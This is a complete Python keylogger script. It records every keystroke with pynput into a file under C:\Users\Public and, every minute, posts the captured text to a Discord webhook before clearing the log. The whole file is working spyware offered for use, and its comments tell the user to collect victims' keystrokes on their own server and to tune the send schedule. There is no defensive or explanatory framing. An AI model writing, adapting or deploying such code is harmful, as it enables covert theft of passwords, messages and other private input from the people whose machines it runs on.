from pynput import keyboard
import requests
import json
import schedule
import time
import os

# sends the file through discordwebhook to your discord sever
file_log = os.path.join("C:\\Users\\Public", "key_logs.txt")
def send_to_discord(file_log):
    with open(file_log, 'r') as file:
        data = file.read()
    webhook_url = 'https://YOUR_WEBHOOK_URL_HERE.com/' #
    response = requests.post(webhook_url, data=json.dumps({"content": data}), headers={"Content-Type": "application/json"})
    print(response.status_code)
    open(file_log, 'w').close()

# main keylog function
def keyPressed(key):
    print(str(key))
    # Erase functionality
    if key == keyboard.Key.backspace:
        with open(file_log, 'r+') as logKey:
            content = logKey.read()
            logKey.seek(0)
            logKey.write(content[:-1]) 
            logKey.truncate()
    else: 
        # spacebar functionality
        with open(file_log, 'a') as logKey:
            try:
                if key == keyboard.Key.space:
                    logKey.write(' ') 
                else:
                    char = key.char
                    logKey.write(char) 
            except AttributeError:
                print("Error getting char")
# Time schedule for when the content of key_logs.txt should be sent through discord, you can modify it how you wish
#schedule.every().hour.do(send_to_discord, file_log=file_log) # hourly               
schedule.every().minute.do(send_to_discord, file_log=file_log) #currently gets the input every minute

# runs the script
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    while True:
        schedule.run_pending()
        time.sleep(1)



